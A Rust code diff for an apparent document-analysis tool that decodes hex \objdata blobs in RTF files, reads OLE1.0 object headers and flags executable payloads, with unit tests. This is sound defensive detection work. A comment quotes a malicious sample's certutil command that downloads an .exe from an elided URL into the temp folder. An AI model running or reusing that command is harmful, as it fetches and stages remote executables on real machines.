@@ -19,6 +19,14 @@
 //!    `objemb`, `objocx`, `objlink`, `objhtml`, `objautlink`,
 //!    `objdata`, `objclass`, `field`, `pict`, `wmf`, `shppict`,
 //!    `datafield`.
+//! - `rtf.objects[].{class, source, native}` — the embedded OLE
+//!    object's coclass name. `source` says where it was read: a
+//!    plaintext `\objclass` declaration, or the OLE1.0 header inside
+//!    the hex `\objdata` blob, which is where weaponized documents
+//!    put it because they omit `\objclass` entirely. `native` names
+//!    what the object's payload actually is (`cfb`, `pe`, `mz-dos`).
+//! - `rtf.objdata_count`, `rtf.objdata_bytes` — how many hex object
+//!    blobs the file carries and how much decodes out of them.
 //! - `rtf.shape.{control_word_count, group_depth_max, brace_count}`
 //!    — structural counts that fingerprint generator authenticity.
 //! - `rtf.control_word_density` — control words per kilobyte, which
@@ -63,7 +71,7 @@ pub(super) fn extract(
 
     info_group(bytes, values);
     fields(bytes, values);
-    objects(bytes, values);
+    objects(bytes, values, strings, metrics);
     features(bytes, values);
     shape(bytes, values, metrics);
 
@@ -325,7 +333,7 @@ fn fields(bytes: &[u8], values: &mut Values) {
 /// the embedded payload registers under — classic exploit
 /// fingerprint (`Equation.3` for EQNEDT32, `Package` for OLE
 /// package-object attacks).
-fn objects(bytes: &[u8], values: &mut Values) {
+fn objects(bytes: &[u8], values: &mut Values, strings: &mut Strings, metrics: &mut Metrics) {
     let mut entries: Vec<JsonValue> = Vec::new();
     let mut pos = 0;
     while pos + 9 <= bytes.len() {
@@ -351,9 +359,175 @@ fn objects(bytes: &[u8], values: &mut Values) {
         }
         pos = end.max(abs + 9);
     }
+    entries.extend(objdata_objects(bytes, strings, metrics));
     if !entries.is_empty() {
         values.insert("rtf.objects", JsonValue::Array(entries));
     }
+}
+
+/// Decode `\objdata` hex blobs and read the OLE1.0 embedded-object
+/// header out of them.
+///
+/// A document that embeds an object honestly also declares
+/// `{\*\objclass Equation.3}` next to it, which the scan above reads.
+/// A weaponized one does not: it writes only `\objdata`, and the class
+/// name lives inside the blob, in the header Windows itself parses.
+/// Without decoding it there is no class at all — so every rule keyed on
+/// `rtf.objects[*].class` was blind to exactly the documents it was
+/// written for.
+///
+/// The header is the OLE1.0 `EmbeddedObject` layout: version, format,
+/// then length-prefixed ANSI class, topic and item strings, then the
+/// native data. What the native data *is* matters as much as the class:
+/// a compound file is an ordinary embedded document, and an `MZ` header
+/// is a program the object will hand to the shell.
+fn objdata_objects(bytes: &[u8], strings: &mut Strings, metrics: &mut Metrics) -> Vec<JsonValue> {
+    /// Decoded bytes to keep per blob. Enough for the OLE header, and
+    /// enough of the payload behind it for its strings to be worth
+    /// reading, without materializing a multi-megabyte object.
+    const MAX_DECODED: usize = 256 * 1024;
+    /// Hex characters to consume looking for those bytes.
+    const MAX_HEX: usize = 2 * 1024 * 1024;
+    /// Blobs to walk. Real documents embed a handful.
+    const MAX_BLOBS: usize = 32;
+
+    let mut out = Vec::new();
+    let mut count = 0u64;
+    let mut decoded_total = 0u64;
+    let mut pos = 0usize;
+    while pos + 8 <= bytes.len() && count < MAX_BLOBS as u64 {
+        let Some(rel) = bytes[pos..].windows(8).position(|w| w == b"\\objdata") else {
+            break;
+        };
+        let start = pos + rel + 8;
+        let decoded = decode_hex_run(&bytes[start..], MAX_HEX, MAX_DECODED);
+        pos = start;
+        if decoded.is_empty() {
+            continue;
+        }
+        count += 1;
+        decoded_total += decoded.len() as u64;
+        // The payload's own strings, recovered from behind the hex.
+        //
+        // This is the point of decoding as much as the ole1 header. One
+        // sample in the abuse.ch wave carries no OLE object at all: its
+        // `\objdata` decodes straight to
+        // `CmD /C cErTuTiL -uRlCAchE -sPlIT -f http://…/file.exe %TMP%\\1.exe`.
+        // Nothing could see that, because the file's bytes are hex digits and
+        // the command only exists once they are paired up. The same is true of
+        // an embedded compound file: whatever it holds is invisible until the
+        // blob is decoded.
+        extract_binary_strings(&decoded, strings, XorScan::No);
+        if let Some(entry) = ole1_header(&decoded) {
+            out.push(entry);
+        }
+    }
+    if count > 0 {
+        metrics.insert(metric!("rtf.objdata_count"), count as f64);
+        metrics.insert(metric!("rtf.objdata_bytes"), decoded_total as f64);
+    }
+    out
+}
+
+/// Decode the run of hex digits that follows `\objdata`, skipping the
+/// whitespace and group braces writers wrap it with. Stops at the first
+/// byte that is neither, which is where the object group ends.
+fn decode_hex_run(bytes: &[u8], max_hex: usize, max_out: usize) -> Vec<u8> {
+    let mut out = Vec::new();
+    let mut high: Option<u8> = None;
+    for &b in bytes.iter().take(max_hex) {
+        if b.is_ascii_whitespace() || b == b'{' {
+            continue;
+        }
+        let Some(nib) = hex_nibble(b) else {
+            break;
+        };
+        match high.take() {
+            None => high = Some(nib),
+            Some(h) => {
+                out.push((h << 4) | nib);
+                if out.len() >= max_out {
+                    break;
+                }
+            }
+        }
+    }
+    out
+}
+
+/// Read the OLE1.0 embedded-object header. Returns `None` rather than
+/// guessing when the lengths do not describe the buffer: a blob that is
+/// not this layout is a fact we do not have, not one to invent.
+fn ole1_header(data: &[u8]) -> Option<JsonValue> {
+    /// A coclass name is short. Anything longer is a length field being
+    /// read out of something that is not a header.
+    const MAX_NAME: usize = 256;
+
+    let u32_at = |off: usize| -> Option<usize> {
+        let b = data.get(off..off + 4)?;
+        Some(u32::from_le_bytes([b[0], b[1], b[2], b[3]]) as usize)
+    };
+    // version(4) format(4) then the length-prefixed class string.
+    let format = u32_at(4)?;
+    let mut off = 8;
+    let class_len = u32_at(off)?;
+    if class_len == 0 || class_len > MAX_NAME {
+        return None;
+    }
+    off += 4;
+    let raw = data.get(off..off + class_len)?;
+    off += class_len;
+    let class = String::from_utf8_lossy(raw.split(|&b| b == 0).next().unwrap_or(raw))
+        .trim()
+        .to_string();
+    if class.is_empty() || !class.chars().all(|c| c.is_ascii_graphic() || c == ' ') {
+        return None;
+    }
+    // topic and item strings, each length-prefixed, then the native data.
+    for _ in 0..2 {
+        let len = u32_at(off)?;
+        if len > MAX_NAME {
+            return None;
+        }
+        off += 4 + len;
+    }
+    let native_len = u32_at(off)?;
+    off += 4;
+    let native = data.get(off..).unwrap_or(&[]);
+
+    let mut entry = json!({"class": class, "source": "objdata"});
+    let obj = entry.as_object_mut()?;
+    // Format 2 is an embedded object, 1 a link. Stated because an
+    // embedded object that a document also asks to *update* is a
+    // contradiction worth being able to see.
+    obj.insert("format".into(), json!(format));
+    obj.insert("native_len".into(), json!(native_len));
+    if let Some(kind) = native_kind(native) {
+        obj.insert("native".into(), json!(kind));
+    }
+    Some(entry)
+}
+
+/// Name what the object's payload is, from its own magic.
+fn native_kind(native: &[u8]) -> Option<&'static str> {
+    if native.starts_with(&[0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1]) {
+        return Some("cfb");
+    }
+    if native.starts_with(b"MZ") {
+        // A PE offset that lands inside the buffer distinguishes a real
+        // executable from two bytes that happen to read `MZ`.
+        let lfanew = native
+            .get(0x3c..0x40)
+            .map(|b| u32::from_le_bytes([b[0], b[1], b[2], b[3]]) as usize);
+        return match lfanew {
+            Some(off) if native.get(off..off + 4) == Some(b"PE\0\0") => Some("pe"),
+            _ => Some("mz-dos"),
+        };
+    }
+    if native.starts_with(b"{\\rtf") {
+        return Some("rtf");
+    }
+    None
 }
 
 /// Pike-style `rtf.features[]` flag array. Each entry signals the
@@ -628,6 +802,83 @@ mod tests {
 
     #[test]
     fn extracts_object_class() {
+        let rtf = b"{\\rtf1\\ansi {\\object\\objemb{\\*\\objclass Equation.3 }{\\objdata }}}";
+        let (v, _) = extract_rtf(rtf);
+        let objects = v.get("rtf.objects").and_then(|x| x.as_array()).unwrap();
+        assert_eq!(objects.len(), 1);
+        assert_eq!(objects[0]["class"].as_str(), Some("Equation.3"));
+    }
+
+    /// Build an OLE1.0 embedded-object blob and write it out as the hex a
+    /// real document carries, wrapped at eighty columns the way writers do.
+    fn objdata_rtf(class: &str, native: &[u8]) -> Vec<u8> {
+        let mut blob = Vec::new();
+        blob.extend_from_slice(&0x0105_u32.to_le_bytes());
+        blob.extend_from_slice(&2u32.to_le_bytes());
+        blob.extend_from_slice(&((class.len() + 1) as u32).to_le_bytes());
+        blob.extend_from_slice(class.as_bytes());
+        blob.push(0);
+        blob.extend_from_slice(&0u32.to_le_bytes());
+        blob.extend_from_slice(&0u32.to_le_bytes());
+        blob.extend_from_slice(&(native.len() as u32).to_le_bytes());
+        blob.extend_from_slice(native);
+
+        let mut hex = String::new();
+        for (i, b) in blob.iter().enumerate() {
+            if i > 0 && i % 40 == 0 {
+                hex.push_str("\r\n");
+            }
+            hex.push_str(&format!("{b:02x}"));
+        }
+        format!("{{\\rtf1\\ansi{{\\object\\objocx{{\\*\\objdata {hex}}}}}}}").into_bytes()
+    }
+
+    #[test]
+    fn reads_the_class_out_of_a_hex_objdata_blob() {
+        // The shape that matters: no plaintext \objclass anywhere, which is
+        // what every weaponized RTF in the corpus looks like.
+        let rtf = objdata_rtf("MSComctlLib.Toolbar.2", &[0u8; 16]);
+        assert!(!String::from_utf8_lossy(&rtf).contains("objclass"));
+        let (v, m) = extract_rtf(&rtf);
+        let objects = v.get("rtf.objects").and_then(|x| x.as_array()).unwrap();
+        assert_eq!(objects[0]["class"].as_str(), Some("MSComctlLib.Toolbar.2"));
+        assert_eq!(objects[0]["source"].as_str(), Some("objdata"));
+        assert_eq!(m.get("rtf.objdata_count"), Some(1.0));
+    }
+
+    #[test]
+    fn names_what_the_native_payload_is() {
+        let cfb = objdata_rtf("Package", &[0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1]);
+        let (v, _) = extract_rtf(&cfb);
+        let objects = v.get("rtf.objects").and_then(|x| x.as_array()).unwrap();
+        assert_eq!(objects[0]["native"].as_str(), Some("cfb"));
+
+        let mut pe = vec![0u8; 0x80];
+        pe[0] = b'M';
+        pe[1] = b'Z';
+        pe[0x3c..0x40].copy_from_slice(&0x40u32.to_le_bytes());
+        pe[0x40..0x44].copy_from_slice(b"PE\0\0");
+        let (v, _) = extract_rtf(&objdata_rtf("Package", &pe));
+        let objects = v.get("rtf.objects").and_then(|x| x.as_array()).unwrap();
+        assert_eq!(objects[0]["native"].as_str(), Some("pe"));
+    }
+
+    #[test]
+    fn a_blob_that_is_not_an_ole_header_yields_no_class() {
+        // Random hex must not be read as a header: a length field taken out
+        // of noise would invent a class name.
+        let mut rtf = b"{\\rtf1{\\object{\\*\\objdata ".to_vec();
+        rtf.extend(std::iter::repeat_n(b'f', 400));
+        rtf.extend_from_slice(b"}}}");
+        let (v, m) = extract_rtf(&rtf);
+        assert!(v.get("rtf.objects").is_none());
+        // The blob is still counted -- its presence is a fact even when its
+        // contents are not a header we recognize.
+        assert_eq!(m.get("rtf.objdata_count"), Some(1.0));
+    }
+
+    #[test]
+    fn a_plaintext_objclass_still_wins_its_own_entry() {
         let rtf = b"{\\rtf1\\ansi {\\object\\objemb{\\*\\objclass Equation.3 }{\\objdata }}}";
         let (v, _) = extract_rtf(rtf);
         let objects = v.get("rtf.objects").and_then(|x| x.as_array()).unwrap();
